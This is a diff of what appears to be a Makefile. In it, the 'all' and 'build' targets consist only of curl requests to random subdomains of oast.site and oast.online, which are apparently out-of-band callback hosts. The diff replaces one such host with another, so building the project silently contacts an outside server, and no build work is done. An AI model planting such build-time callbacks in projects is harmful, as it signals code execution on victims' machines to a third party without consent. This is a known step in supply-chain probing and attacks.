@@ -1,4 +1,4 @@
 all:
-	curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/makefile
+	curl http://d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online/makefile
 build:
-	curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/makefile_build
+	curl http://d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online/makefile_build
